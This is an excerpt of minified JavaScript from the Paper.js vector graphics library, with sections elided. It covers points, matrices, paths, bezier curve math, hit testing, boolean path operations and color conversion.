                            n[l] = r ? {} : t, o = "_" + o, e["get" + a] = function() {
                                return this[o]
                            }, e["set" + a] = function(t) {
                                var e = this[o];
        ...
        o = s.extend({
            ...
            initialize: function e() {
                ...
                if (!this.agent) {
                    ...
                    a && (l[a] = !0), r.replace(/(opera|chrome|safari|webkit|firefox|msie|trident|atom|node|jsdom)\/?\s*([.\d]+)(?:.*version\/([.\d]+))?(?:.*rv\:v?([.\d]+))?/g, function(t, e, i, n, s) {
                        if (!l.chrome) {
                            var r = "opera" === e ? n : /^(node|trident)$/.test(e) ? s : i;
                            l.version = r, l.versionNumber = parseFloat(r), e = "trident" === e ? "msie" : e, l.name = e, l[e] = !0
                        }
                    }), l.chrome && delete l.webkit, l.atom && delete l.chrome, l.node = l.jsdom
                }
            },
            version: "0.12.1",
            getView: function() {
    ...
    var h = new function() {
            ...
            return {
                ...
                integrate: function(i, n, s, r) {
                    for (var o = t[r - 2], a = e[r - 2], l = .5 * (s - n), h = l + n, u = 0, c = r + 1 >> 1, d = 1 & r ? a[u++] * i(h) : 0; u < c;) {
                        var f = l * o[u];
                        d += a[u++] * (i(h + f) + i(h - f))
                    }
                    return l * d
                ...
                findRoot: function(t, e, n, s, r, o, a) {
                    for (var h = 0; h < o; h++) {
                        ...
                        u > 0 ? (r = n, n = d <= s ? .5 * (s + r) : d) : (s = n, n = d >= r ? .5 * (s + r) : d)
                    }
                    return l(n, s, r)
                },
                ...
                solveCubic: function(t, e, r, u, d, f, p) {
                    var g, v, m, _, y, w = c(i(t), i(e), i(r), i(u));
        ...
        }, s.each(["round", "ceil", "floor", "abs"], function(t) {
            var e = Math[t];
            this[t] = function() {
        ...
        g = s.extend({
            ...
            initialize: function(t, i, n, r) {
                var o, a = typeof t;
                if ("number" === a ? (this._set(t, i, n, r), o = 4) : "undefined" === a || null === t ? (this._set(0, 0, 0, 0), o = null === t ? 1 : 0) : 1 === arguments.length && (Array.isArray(t) ? (this._set.apply(this, t), o = 1) : t.x !== e || t.width !== e ? (this._set(t.x || 0, t.y || 0, t.width || 0, t.height || 0), o = 1) : t.from === e && t.to === e && (this._set(0, 0, 0, 0), s.filter(this, t), o = 1)), o === e) {
                    var l, h, u = c.readNamed(arguments, "from"),
                        d = s.peek(arguments),
                        p = u.x,
                        g = u.y;
        ...
        v = g.extend({
            ...
            var t = g.prototype;
            return s.each(["x", "y", "width", "height"], function(t) {
            ...
            }, s.each(["Point", "Size", "Center", "Left", "Top", "Right", "Bottom", "CenterX", "CenterY", "TopLeft", "TopRight", "BottomLeft", "BottomRight", "LeftCenter", "TopCenter", "RightCenter", "BottomCenter"], function(e) {
                var i = "set" + e;
                this[i] = function() {
        ...
        m = s.extend({
            ...
            initialize: function t(e, i) {
                var n = arguments.length,
                    s = !0;
                if (n >= 6 ? this._set.apply(this, arguments) : 1 === n || 2 === n ? e instanceof t ? this._set(e._a, e._b, e._c, e._d, e._tx, e._ty, i) : Array.isArray(e) ? this._set.apply(this, i ? e.concat([i]) : e) : s = !1 : n ? s = !1 : this.reset(), !s) throw new Error("Unsupported matrix parameters");
                return this
            },
            set: "#initialize",
        ...
        }, s.each(["a", "b", "c", "d", "tx", "ty"], function(t) {
            var e = s.capitalize(t),
                i = "_" + t;
            this["get" + e] = function() {
                return this[i]
        ...
        _ = s.extend({
            ...
            initialize: function(t, e, i, n, s) {
                var r = !1;
                arguments.length >= 4 ? (this._px = t, this._py = e, this._vx = i, this._vy = n, r = s) : (this._px = t.x, this._py = t.y, this._vx = e.x, this._vy = e.y, r = i), r || (this._vx -= this._px, this._vy -= this._py)
            },
            getPoint: function() {
        ...
        y = a.extend({
            ...
            _compactSerialize: !0,
            initialize: function(t) {
                a.call(this, !0), this._children = [], this._namedChildren = {}, this._activeLayer = null, this._currentStyle = new q(null, null, this), this._view = V.create(this, t || tt.getCanvas(1, 1)), this._selectionItems = {}, this._selectionCount = 0, this._updateVersion = 0
            },
            _serialize: function(t, e) {
            ...
            draw: function(t, e, i) {
                ...
                for (var n = this._children, r = new s({
                        offset: new c(0, 0),
                        pixelRatio: i,
                        viewMatrix: e.isIdentity() ? null : e,
                        matrices: [new m],
                        updateMatrix: !0
                    }), o = 0, a = n.length; o < a; o++) n[o].draw(t, r);
        ...
        w = s.extend(r, {
            ...
            _initialize: function(t, i) {
                var n = t && s.isPlainObject(t),
                    ...
                    l = st.settings;
                return this._id = r ? null : u.get(), this._parent = this._index = null, this._applyMatrix = this._canApplyMatrix && l.applyMatrix, i && o.translate(i), o._owner = this, this._style = new q(a._currentStyle, this, a), r || n && 0 == t.insert || !l.insertItems && (!n || !0 !== t.insert) ? this._setProject(a) : (n && t.parent || a)._insertItem(e, this, !0), n && t !== w.NO_INSERT && this.set(t, {
                    internal: !0,
                    insert: !0,
                    project: !0,
                    parent: !0
            ...
            _changed: function(t) {
                var i = this._symbol,
                    n = this._parent || i,
                    s = this._project;
                8 & t && (this._bounds = this._position = this._decomposed = e), 16 & t && (this._globalMatrix = e), n && 72 & t && w._clearBoundsCache(n), 2 & t && w._clearBoundsCache(this), s && s._changed(t, this), i && i._changed(t)
            },
            getId: function() {
                return this._id
            },
        ...
        }, s.each(["locked", "visible", "blendMode", "opacity", "guide"], function(t) {
            var e = s.capitalize(t),
                i = "_" + t,
                n = {
                    locked: 256,
            ...
            setBounds: function() {
                var t = g.read(arguments),
                    ...
                    n = new m,
                    s = t.getCenter();
                n.translate(s), t.width == e.width && t.height == e.height || (i.isInvertible() || (i.set(i._backup || (new m).translate(i.getTranslation())), e = this.getBounds()), n.scale(0 !== e.width ? t.width / e.width : 0, 0 !== e.height ? t.height / e.height : 0)), s = e.getCenter(), n.translate(-s.x, -s.y), this.transform(n)
            },
            ...
            _getCachedBounds: function(t, e, i) {
                ...
                var n = e.internal && !i,
                    ...
                    a = this._bounds;
                if (w._updateBoundsCache(this._parent || this._symbol, s), o && a && o in a) return {
                    rect: (d = a[o]).rect.clone(),
            ...
            statics: {
                ...
                _getBounds: function(t, e, i) {
                    ...
                    return {
                        rect: isFinite(n) ? new g(n, r, s - n, o - r) : new g,
                        nonscaling: a
                    }
                }
            }
            ...
            rasterize: function(t, i) {
                ...
                if (!l.isZero()) {
                    ...
                    c.save(), d.applyToContext(c), this.draw(c, new s({
                        matrices: [d]
                    })), c.restore(), h.setCanvas(u)
                }
            ...
            _hitTest: function(t, e, i) {
                ...
                var l, h, u = !(e.guides && !this._guide || e.selected && !this.isSelected() || e.type && e.type !== s.hyphenate(this._class) || e.class && !(this instanceof e.class)),
                    c = e.match,
                    d = this;
                ...
                function g(e, i) {
                    ...
                    if (t.subtract(n).divide(a).length <= 1) return new I(e, d, {
                        name: i ? s.hyphenate(i) : e,
                        point: n
                    })
                }
                var v = e.position,
            ...
            matches: function(t, e) {
                ...
                if (e) {
                    ...
                    if (s.isPlainObject(e)) return function t(e, i) {
                        for (var n in e)
                            if (e.hasOwnProperty(n)) {
                                var r = e[n],
                                    o = i[n];
            ...
            _removeNamed: function() {
                ...
                if (t) {
                    var e = t._children,
                        ...
                        n = this._name,
                        s = i[n],
                        r = s ? s.indexOf(this) : -1; - 1 !== r && (e[n] == this && delete e[n], s.splice(r, 1), s.length ? e[n] = s[0] : delete i[n])
                }
            },
            _remove: function(t, e) {
                var i = this._getOwner(),
                    n = this._project,
                    r = this._index;
                return this._style && this._style._dispose(), !!i && (this._name && this._removeNamed(), null != r && (n._activeLayer === this && (n._activeLayer = this.getNextSibling() || this.getPreviousSibling()), s.splice(i._children, null, r, 1)), this._installEvents(!1), t && n._changes && this._changed(5), e && i._changed(11, this), this._parent = null, !0)
            },
            remove: function() {
            ...
            _getOrder: function(t) {
                ...
                for (var i = e(this), n = e(t), s = 0, r = Math.min(i.length, n.length); s < r; s++)
                    if (i[s] != n[s]) return i[s]._index < n[s]._index ? 1 : -1;
                return 0
            },
        ...
        }, s.each(["rotate", "scale", "shear", "skew"], function(t) {
            var e = "rotate" === t;
            this[t] = function() {
                ...
                if (this._visible && 0 !== this._opacity) {
                    ...
                    if (o.isInvertible()) {
                        ...
                        var m = i ? i.appended(r) : this._canScaleStroke && !this.getStrokeScaling(!0) && s,
                            _ = !p && e.clipItem,
                            y = !m || _;
                        if (p ? (t.globalAlpha = c, f && (t.globalCompositeOperation = u)) : y && t.translate(-l.x, -l.y), y && (p ? r : s).applyToContext(t), _ && e.clipItem.draw(t, e.extend({
                                clip: !0
                            })), m) {
        ...
        }, s.each(["down", "drag", "up", "move"], function(t) {
            ...
            tween: function(t, e, i) {
                ...
                return r && this.on("frame", function t(e) {
        ...
        x = w.extend({
            ...
            _getBounds: function t(e, i) {
                ...
                return n ? n._getCachedBounds(e && e.appended(n._matrix), s.set({}, i, {
                    stroke: !1
        ...
        S = w.extend({
            ...
            toPath: function(t) {
                var i = new(E[s.capitalize(this._type)])({
                    center: new c,
                    size: this._size,
                    radius: this._radius,
                    insert: !1
                ...
                if (r || o || a) {
                    ...
                    if (e.dontStart || t.beginPath(), l && c) t.arc(0, 0, u, 0, 2 * Math.PI, !0);
                        ...
                        if (l && "rectangle" === h && 0 === d && 0 === f) t.rect(-g / 2, -v / 2, g, v);
                            ...
                            n && n.transform(b, b, 32), t.moveTo(b[0], b[1]), t.bezierCurveTo(b[2], b[3], b[4], b[5], b[6], b[7]), m !== d && t.lineTo(b[8], b[9]), t.bezierCurveTo(b[10], b[11], b[12], b[13], b[14], b[15]), _ !== f && t.lineTo(b[16], b[17]), t.bezierCurveTo(b[18], b[19], b[20], b[21], b[22], b[23]), m !== d && t.lineTo(b[24], b[25]), t.bezierCurveTo(b[26], b[27], b[28], b[29], b[30], b[31])
                        }
                    }
                    t.closePath()
                }
            ...
            function t(t, e, i) {
                ...
                if (!n.isZero())
                    for (var s = t._size.divide(2), r = 1; r <= 4; r++) {
                        ...
                        if (new g(i ? a.add(o.multiply(i)) : a, l).contains(e)) return {
                            point: l,
                            quadrant: r
                        }
                    }
        ...
        C = w.extend({}, {
            ...
            setImage: function(t) {
                ...
                this._setImage(t), this._loaded ? setTimeout(i, 0) : t && W.add(t, {
                    load: function(n) {
                        e._setImage(t), i(n)
                    },
                    error: i
            ...
            _setImage: function(t) {
                this._canvas && tt.release(this._canvas), t && t.getContext ? (this._image = null, this._canvas = t, this._loaded = !0) : (this._image = t, this._canvas = null, this._loaded = !!(t && t.src && t.complete)), this._size = new f(t ? t.naturalWidth || t.width : 0, t ? t.naturalHeight || t.height : 0), this._context = null, this._changed(1033)
            },
            getCanvas: function() {
                if (!this._canvas) {
            ...
            getAverageColor: function(t) {
                ...
                a.applyToContext(o), i && i.draw(o, new s({
                    clip: !0,
                    matrices: [a]
                ...
                for (var u = o.getImageData(.5, .5, Math.ceil(n), Math.ceil(r)).data, c = [0, 0, 0], d = 0, p = 0, v = u.length; p < v; p += 4) {
                    var _ = u[p + 3];
        ...
        O = s.extend({
            ...
            initialize: function(t, i, n, s, r, o) {
                ...
                c > 0 && (null == t || "object" == typeof t ? 1 === c && t && "point" in t ? (a = t.point, l = t.handleIn, h = t.handleOut, u = t.selection) : (a = t, l = i, h = n, u = s) : (a = [t, i], l = n !== e ? [n, s] : null, h = r !== e ? [r, o] : null)), new P(a, this, "_point"), new P(l, this, "_handleIn"), new P(h, this, "_handleOut"), u && this.setSelection(u)
            },
            _serialize: function(t, e) {
                var i = this._point,
                    n = this._selection,
            ...
            _changed: function(t) {
                ...
                if (e) {
                    var i, n = e._curves,
                        s = this._index;
                    n && (t && t !== this._point && t !== this._handleIn || !(i = s > 0 ? n[s - 1] : e._closed ? n[n.length - 1] : null) || i._changed(), t && t !== this._point && t !== this._handleOut || !(i = n[s]) || i._changed()), e._changed(41)
                }
            },
            getPoint: function() {
                return this._point
            ...
            _transformCoordinates: function(t, e, i) {
                var n = this._point,
                    ...
                    a = n._y,
                    l = 2;
                return e[0] = o, e[1] = a, s && (e[l++] = s._x + o, e[l++] = s._y + a), r && (e[l++] = r._x + o, e[l++] = r._y + a), t && (t._transformCoordinates(e, e, l / 2), o = e[0], a = e[1], i ? (n._x = o, n._y = a, l = 2, s && (s._x = e[l++] - o, s._y = e[l++] - a), r && (r._x = e[l++] - o, r._y = e[l++] - a)) : (s || (e[l++] = o, e[l++] = a), r || (e[l++] = o, e[l++] = a))), e
            }
        }),
        P = c.extend({
        ...
        M = s.extend({
            ...
            initialize: function(t, e, i, n, s, r, o, a) {
                ...
                3 === p ? (this._path = t, l = e, h = i) : p ? 1 === p ? "segment1" in t ? (l = new O(t.segment1), h = new O(t.segment2)) : "point1" in t ? (u = t.point1, d = t.handle1, f = t.handle2, c = t.point2) : Array.isArray(t) && (u = [t[0], t[1]], c = [t[6], t[7]], d = [t[2] - t[0], t[3] - t[1]], f = [t[4] - t[6], t[5] - t[7]]) : 2 === p ? (l = new O(t), h = new O(e)) : 4 === p ? (u = t, d = e, f = i, c = n) : 8 === p && (u = [t, e], c = [o, a], d = [i - t, n - e], f = [s - o, r - a]) : (l = new O, h = new O), this._segment1 = l || new O(u, null, d), this._segment2 = h || new O(c, f, null)
            },
            _serialize: function(t, e) {
            ...
            statics: {
                ...
                getNearestTime: function(t, e) {
                    if (M.isStraight(t)) {
                        ...
                        return a < 1e-12 ? 0 : a > .999999999999 ? 1 : M.getTimeOf(t, new c(i + a * s, n + a * r))
                    }
                    var l = 1 / 0,
                        h = 0;
                    ...
                    for (var f = .005; f > 1e-8;) u(h - f) || u(h + f) || (f /= 2);
                    return h
                },
        ...
        }, s.each(["getBounds", "getStrokeBounds", "getHandleBounds"], function(t) {
            this[t] = function() {
                    ...
                    classify: function(t) {
                        ...
                        function y(t, i, n) {
                            var s = i !== e,
                                r = s && i > 0 && i < 1,
                                o = s && n > 0 && n < 1;
                            return !s || (r || o) && ("loop" !== t || r && o) || (t = "arch", r = o = !1), {
                                type: t,
                                roots: r || o ? r && o ? i < n ? [i, n] : [n, i] : [r ? i : n] : null
                            }
                        }
            ...
            function r(i, s, r, o, l, h) {
                var u = Math.min,
                    d = Math.max;
                if (d(i[0], i[2], i[4], i[6]) + 1e-12 > u(s[0], s[2], s[4], s[6]) && u(i[0], i[2], i[4], i[6]) - 1e-12 < d(s[0], s[2], s[4], s[6]) && d(i[1], i[3], i[5], i[7]) + 1e-12 > u(s[1], s[3], s[5], s[7]) && u(i[1], i[3], i[5], i[7]) - 1e-12 < d(s[1], s[3], s[5], s[7])) {
                    var f = a(i, s);
                    if (f)
                        for (var p = 0; p < 2; p++) {
                            var g = f[p];
                            ...
                            if ((y ? function(e, i, n, s, r, o) {
                                    ...
                                    } else if (n = M.getPart(n, v, m), m - v > .8)
                                        if (N - D > g - p) F = (D + N) / 2, c = i(s, (H = M.subdivide(n, .5))[0], o, r, a, l, !h, u, c, p, g, D, F), c = i(s, H[1], o, r, a, l, !h, u, c, p, g, F, N);
                                        else {
                                            var H;
                                            B = (p + g) / 2, c = i((H = M.subdivide(s, .5))[0], n, o, r, a, l, !h, u, c, p, B, D, N), c = i(H[1], n, o, r, a, l, !h, u, c, B, g, D, N)
                                        } else c = g - p >= 1e-9 ? i(s, n, o, r, a, l, !h, u, c, p, g, D, N) : i(n, s, r, o, a, l, h, u, c, D, N, p, g);
                                    return c
                                })(w ? s : i, w ? i : s, w ? o : r, w ? r : o, l, h, w, 0, 0, 0, 1, 0, 1), !y || l.length === x)
                                for (p = 0; p < 4; p++) {
                                    var b = p >> 1,
                                        S = 1 & p,
                                        C = 6 * b,
            ...
            function a(t, e) {
                ...
                var n = Math.abs,
                    ...
                    g = u[6] - f,
                    v = u[7] - p;
                if (s(f, p, g, v, d[0], d[1], !0) < r && s(f, p, g, v, d[6], d[7], !0) < r) !l && s(f, p, g, v, u[2], u[3], !0) < r && s(f, p, g, v, u[4], u[5], !0) < r && s(f, p, g, v, d[2], d[3], !0) < r && s(f, p, g, v, d[4], d[5], !0) < r && (o = a = l = !0);
            ...
            getOffset: function() {
                ...
                if (null == t) {
                    ...
                    var e = this.getPath(),
                        i = this.getIndex();
                    if (e && null != i)
                        for (var n = e.getCurves(), s = 0; s < i; s++) t += n[s].getLength();
        ...
        }, s.each(M._evaluateMethods, function(t) {
            var e = t + "At";
            this[t] = function() {
                var t = this.getCurve(),
                    i = this.getTime();
        ...
        A = w.extend({
            ...
            setPathData: function(t) {
                var e, i, n, s = t && t.match(/[mlhvcsqtaz][^mlhvcsqtaz]*/gi),
                    r = !1,
                    o = new c,
                    a = new c;
            ...
            interpolate: function(t, e, i) {
                ...
                var l = a.length,
                    h = o.length;
                if (l < h)
                    for (var u = n ? O : E, c = l; c < h; c++) this.add(new u);
        ...
        E = A.extend({
            ...
            _changed: function t(i) {
                if (t.base.call(this, i), 8 & i) {
                    if (this._length = this._area = e, 32 & i) this._version++;
                        ...
                        for (var n = 0, s = this._curves.length; n < s; n++) this._curves[n]._changed()
            ...
            getPathData: function(t, e) {
                var i, n, s, r, o, a, h, u, c = this._segments,
                    d = c.length,
                    f = new l(e),
                    p = new Array(6),
                    g = !0,
            ...
            splitAt: function(t) {
                ...
                if (i >= 0 && i < s.length) {
                    ...
                    var r, o = this.removeSegments(i, this._segments.length, !0);
            ...
            split: function(t, i) {
                var n, s = i === e ? t : (n = this.getCurves()[t]) && n.getLocationAtTime(i);
            ...
            flatten: function(t) {
                for (var e = new $(this, t || .25, 256, !0).parts, i = e.length, n = [], s = 0; s < i; s++) n.push(new O(e[s].curve.slice(0, 2)));
            ...
            smooth: function(t) {
                ...
                if (/^(?:asymmetric|continuous)$/.test(s)) {
                    ...
                    for (x = u; x <= c; x++) r[x < 0 ? x + o : x].smooth(n, !h && x === u, !h && x === c)
            },
            toShape: function(t) {
                if (!this._closed) return null;
                var i, n, s, r, o, a, l, u = this._segments;
                ...
                if (!this.hasHandles() && 4 === u.length && c(0, 2) && c(1, 3) && (o = u[1], a = o.getPrevious(), l = o.getNext(), a._handleOut.isZero() && o._handleIn.isZero() && o._handleOut.isZero() && l._handleIn.isZero() && o._point.subtract(a._point).isOrthogonal(l._point.subtract(o._point))) ? (i = S.Rectangle, n = new f(p(0, 3), p(0, 1)), r = u[1]._point.add(u[2]._point).divide(2)) : 8 === u.length && d(0) && d(2) && d(4) && d(6) && c(1, 5) && c(3, 7) ? (i = S.Rectangle, s = (n = new f(p(1, 6), p(0, 3))).subtract(new f(p(0, 7), p(1, 2))).divide(2), r = u[3]._point.add(u[4]._point).divide(2)) : 4 === u.length && d(0) && d(1) && d(2) && d(3) && (h.isZero(p(0, 2) - p(1, 3)) ? (i = S.Circle, s = p(0, 2) / 2) : (i = S.Ellipse, s = new f(p(2, 0) / 2, p(3, 1) / 2)), r = u[1]._point), i) {
            ...
            _hitTestSelf: function(t, e, i, n) {
                ...
                function b(t, i, n) {
                    if (!e.selected || i.isSelected()) {
                        var s = t._point;
                        if (i !== s && (i = i.add(s)), x(i, v)) return new I(n, u, {
                            segment: t,
                            point: i
                        })
                    }
                ...
                function T(e) {
                    var i, l = p || e._index > 0 && e._index < f - 1;
                    return "round" === (l ? s : r) ? x(e._point, v) : (a = new E({
                        internal: !0,
                        closed: !0
                    }), l ? e.isSmooth() || E._addBevelJoin(e, s, w, o, null, n, C, !0) : "square" === r && E._addSquareCap(e, r, w, null, n, C, !0), a.isEmpty() ? void 0 : a.contains(t) || (i = a.getNearestLocation(t)) && x(i.getPoint(), g))
                }
                ...
                return !l && _ && this._contains(t) || l && !m && !y ? new I("fill", this) : l ? new I(m ? "stroke" : "curve", this, {
                    location: l,
                    point: l.getPoint()
                }) : null
            }
            ...
            function t(t, e, i) {
                var n, s, r, o, a, l, h, u, c = e._segments,
                    d = c.length,
                    f = new Array(6),
                    p = !0;
            ...
            return {
                ...
                curveTo: function() {
                    var e = c.read(arguments),
                        i = c.read(arguments),
                        n = s.pick(s.read(arguments), .5),
                        r = 1 - n,
                        o = t(this)._point,
                        a = e.subtract(o.multiply(r * r)).subtract(i.multiply(n * n)).divide(2 * n * r);
                    if (a.isNaN()) throw new Error("Cannot put a curve through points with parameter = " + n);
                    this.quadraticCurveTo(a, i)
                },
                arcTo: function() {
                    var e, i, n, r, o = Math.abs,
                        a = Math.sqrt,
                        l = t(this),
                        u = l._point,
                        d = c.read(arguments),
                    ...
                    if ("boolean" == typeof(x = s.pick(p, !0))) var g = (S = u.add(d).divide(2)).add(S.subtract(u).rotate(x ? -90 : 90));
                        ...
                        e = new c(k * T / I, -I * C / k).multiply((b === x ? -1 : 1) * a(E)).rotate(w).add(S), i = (n = (r = (new m).translate(e).rotate(w).scale(k, I))._inverseTransform(u)).getDirectedAngle(r._inverseTransform(d)), !x && i > 0 ? i -= 360 : x && i < 0 && (i += 360)
                    }
                    if (g) {
            ...
            return {
                ...
                Rectangle: function() {
                    var e, n = g.readNamed(arguments, "rectangle"),
                        s = f.readNamed(arguments, "radius", 0, {
                            readNull: !0
                        }),
                        r = n.getBottomLeft(!0),
                        o = n.getTopLeft(!0),
                    ...
                    if (!s || s.isZero()) e = [new O(r), new O(o), new O(a), new O(l)];
                        ...
                        var h = (s = f.min(s, n.getSize(!0).divide(2))).width,
                            ...
                            c = h * t,
                            d = u * t;
                        e = [new O(r.add(h, 0), null, [-c, 0]), new O(r.subtract(0, u), [0, d]), new O(o.add(0, u), null, [0, -d]), new O(o.add(h, 0), [-c, 0], null), new O(a.subtract(h, 0), null, [c, 0]), new O(a.add(0, u), [0, -d], null), new O(l.subtract(0, u), null, [0, d]), new O(l.subtract(h, 0), [c, 0])]
                    }
                ...
                RegularPolygon: function() {
                    for (var t = c.readNamed(arguments, "center"), e = s.readNamed(arguments, "sides"), n = s.readNamed(arguments, "radius"), r = 360 / e, o = e % 3 == 0, a = new c(0, o ? -n : n), l = o ? -1 : .5, h = new Array(e), u = 0; u < e; u++) h[u] = new O(t.add(a.rotate((u + l) * r)));
                    return i(h, !0, arguments)
                },
                Star: function() {
                    for (var t = c.readNamed(arguments, "center"), e = 2 * s.readNamed(arguments, "points"), n = s.readNamed(arguments, "radius1"), r = s.readNamed(arguments, "radius2"), o = 360 / e, a = new c(0, -1), l = new Array(e), h = 0; h < e; h++) l[h] = new O(t.add(a.rotate(o * h).multiply(h % 2 ? r : n)));
    ...
    var L = A.extend({
        ...
        insertChildren: function t(e, i) {
            ...
            for (var o = i.length - 1; o >= 0; o--) {
                var a = n[o];
                n !== i || a instanceof E || (n = s.slice(n)), Array.isArray(a) ? n[o] = new E({
                    segments: a,
                    insert: !1
        ...
        _hitTestChildren: function t(e, i, n) {
            return t.base.call(this, e, i.class === E || "path" === i.type ? i : s.set({}, i, {
                fill: !1
            }), n)
        },
        _draw: function(t, e, i, n) {
        ...
        return s.each(["lineTo", "cubicCurveTo", "quadraticCurveTo", "curveTo", "arcTo", "lineBy", "cubicCurveBy", "quadraticCurveBy", "curveBy", "arcBy"], function(e) {
            this[e] = function() {
                var i = t(this, !0);
    ...
    }, s.each(["reverse", "flatten", "simplify", "smooth"], function(t) {
        this[t] = function(e) {
    ...
    A.inject(new function() {
        ...
        function a(t, e, i, n, s) {
            ...
            return r.addChildren(t, !0), r = r.reduce({
                simplify: e
            }), s && 0 == s.insert || r.insertAbove(n && i.isSibling(n) && i.getIndex() < n.getIndex() ? n : i), r.copyAttributes(i, !0), r
        }
        ...
        function l(t, e, i, n) {
            ...
            var d, g = p(z.expand(l.getCrossings(h))),
                _ = l._children || [l],
                y = h && (h._children || [h]),
                w = [],
                x = [];
            ...
            if (g.length) {
                ...
                d = m(w, c)
            } else d = f(y ? _.concat(y) : _.slice(), function(t) {
                return !!c[t]
            });
            return a(d, !0, t, e, n)
        }
        ...
        function g(e, s, r, o, a) {
                ...
                if (!(p < t(h, d) || p > i(h, d))) {
                    ...
                    if (h !== d) {
                        var O = p === h ? 0 : p === d ? 1 : m > i(y, w, C, I) || _ < t(y, w, C, I) ? 1 : M.solveCubic(n, c, p, k, 0, 1) > 0 ? k[0] : 1,
                            ...
                            A = l[c] > l[c + 6] ? 1 : -1,
                            E = l[u + 6];
                        return p !== h ? (P < m ? x += z : P > _ ? b += z : S = !0, P > f - v && P < f + v && (T /= 2)) : (z !== A ? y < m ? x += z : y > _ && (b += z) : y != E && (E < _ && P > _ ? (b += z, S = !0) : E > m && P < m && (x += z, S = !0)), T = 0), l = n, !a && P > m && P < _ && 0 === M.getTangent(n, O)[r ? "x" : "y"] && g(e, s, !r, o, !0)
                    }(y < _ && I > m || I < _ && y > m) && (S = !0)
                }
            }
            ...
            function O(e) {
                ...
                if (p <= i(n, s, o, a) && p >= t(n, s, o, a))
                    for (var l, h = e[u + 0], d = e[u + 2], f = e[u + 4], g = e[u + 6], v = m > i(h, d, f, g) || _ < t(h, d, f, g) ? [e] : M.getMonoCurves(e, r), y = 0, w = v.length; y < w; y++)
                        if (l = I(v[y])) return l
            }
        ...
        function v(t, e, i, s, r) {
            ...
            for (var c = [.5, .25, .75], d = {
                    winding: 0,
                    quality: -1
                }, f = 0; f < c.length && d.quality < .5; f++) {
                u = l * c[f];
                for (var p = 0, v = o.length; p < v; p++) {
                    var m = o[p],
                        _ = m.length;
                    if (u <= _) {
                        var y, w = (y = m.curve)._path,
                            x = w._parent,
        ...
        function m(t, e) {
            ...
            for (var l = 0, h = t.length; l < h; l++) {
                ...
                for (; p;) {
                    ...
                    if (T && u && (_.push(u), u = null), u || (T && S.push(f), u = {
                        ...
                        for (c.length = 0;
                            (f = u && u.crossings.shift()) && f._path || (f = null, (u = _.pop()) && (c = u.visited, d = u.handleIn)), u && !s(f););
                        if (!f) break
                    }
                    var P = f.getNext();
        ...
        return {
            ...
            resolveCrossings: function() {
                ...
                var n = !1,
                    ...
                    a = n && r && [];
                if (o = z.expand(o), n)
                    for (var l = p(o, function(t) {
                            return t.hasOverlap()
                        }, a), h = l.length - 1; h >= 0; h--) {
                        var u = l[h],
                            c = u._path,
                            f = u._segment,
                            g = f.getPrevious(),
                ...
                }, a), a && d(a), e = m(s.each(e, function(t) {
                    s.push(this, t._segments)
                }, [])));
                var _, y = e.length;
                return y > 1 && t ? (e !== t && this.setChildren(e), _ = this) : 1 !== y || t || (e[0] !== this && this.setSegments(e[0].removeSegments()), _ = this), _ || ((_ = new L(w.NO_INSERT)).addChildren(e), (_ = _.reduce()).copyAttributes(this), this.replaceWith(_)), _
            },
            reorient: function(t, i) {
                var n = this._children;
                return n && n.length ? this.setChildren(f(this.removeChildren(), function(e) {
                    return !!(t ? e : 1 & e)
    ...
    var $ = s.extend({
            ...
            initialize: function(t, e, i, n, s) {
                ...
                function d(t, i) {
                    ...
                    o.push(r),
                        function t(i, s, r, o) {
                            if (!(o - r > h) || n && M.isStraight(i) || M.isFlatEnough(i, e || .25)) {
                                var u = i[6] - i[0],
                                    c = i[7] - i[1],
                                    d = Math.sqrt(u * u + c * c);
                                d > 0 && (l += d, a.push({
            ...
            _get: function(t) {
                ...
                for (; e < n; e++) {
                    ...
                    if (r.offset >= t) {
                        ...
                        return {
                            index: r.index,
                            time: a + (r.time - a) * (t - l) / (r.offset - l)
                        }
                    }
                }
                return {
        ...
        j = s.extend({
            ...
            generateBezier: function(t, e, i, n, s) {
                for (var r = Math.abs, o = this.points, a = o[t], l = o[e], h = [
                        [0, 0],
                        [0, 0]
                ...
                var S, C, T = h[0][0] * h[1][1] - h[1][0] * h[0][1];
                if (r(T) > 1e-12) {
            ...
            reparameterize: function(t, e, i, n) {
                ...
                s = 1;
                for (var r = i.length; s < r; s++)
                    if (i[s] <= i[s - 1]) return !1;
                return !0
            },
            ...
            evaluate: function(t, e, i) {
                for (var n = e.slice(), s = 1; s <= t; s++)
                    for (var r = 0; r <= t - s; r++) n[r] = n[r].multiply(1 - i).add(n[r + 1].multiply(i));
                return n[0]
            },
        ...
        N = D.extend({
            ...
            _getBounds: function(t, e) {
                ...
                var h = new g(l, s ? -.75 * o : 0, a, s * o);
                return t ? t._transformBounds(h, h) : h
            }
        }),
        F = s.extend(new function() {
            var t, e = {
                    gray: ["gray"],
                    rgb: ["red", "green", "blue"],
            ...
            var o = [
                ...
                a = {
                    ...
                    "hsb-rgb": function(t, e, i) {
                        var n, s = (t = (t / 60 % 6 + 6) % 6) - (n = Math.floor(t)),
                    ...
                    "rgb-hsl": function(t, e, i) {
                        var n = Math.max(t, e, i),
                            ...
                            o = 0 === r,
                            a = (n + s) / 2;
                        return [o ? 0 : 60 * (n == t ? (e - i) / r + (e < i ? 6 : 0) : n == e ? (i - t) / r + 2 : (t - e) / r + 4), o ? 0 : a < .5 ? r / (n + s) : r / (2 - n - s), a]
                    },
                    "hsl-rgb": function(t, e, i) {
                        if (0 === e) return [i, i, i];
                        for (var n = [(t = (t / 360 % 1 + 1) % 1) + 1 / 3, t, t - 1 / 3], s = i < .5 ? i * (1 + e) : i + e - i * e, r = 2 * i - s, o = [], a = 0; a < 3; a++) {
                            var l = n[a];
            ...
            return s.each(e, function(t, i) {
                n[i] = [], s.each(t, function(t, r) {
                    var o = s.capitalize(t),
                        a = /^(hue|saturation)$/.test(t),
                        l = n[i][r] = "gradient" === i ? "gradient" === t ? function(t) {
                            var e = this._components[0];
                            return e !== (t = B.read(Array.isArray(t) ? t : arguments, 0, {
                                readNull: !0
                    ...
                    this["get" + o] = function() {
                        ...
                        this._type === i || a && /^hs[bl]$/.test(this._type) || (this._components = this._convert(i), this._properties = e[i], this._type = i), this._components[r] = l.call(this, t), this._changed()
                    }
                }, this)
            }, {
                _class: "Color",
                ...
                initialize: function o(a) {
                    ...
                    if ("string" === g && a in e && (l = a, a = d[1], Array.isArray(a) ? (h = a, u = d[2]) : (f && (p = 1), d = s.slice(d, 1), g = typeof a)), !h) {
                        if (c = "number" === g ? d : "object" === g && null != a.length ? a : null) {
                            ...
                            var m = function(e) {
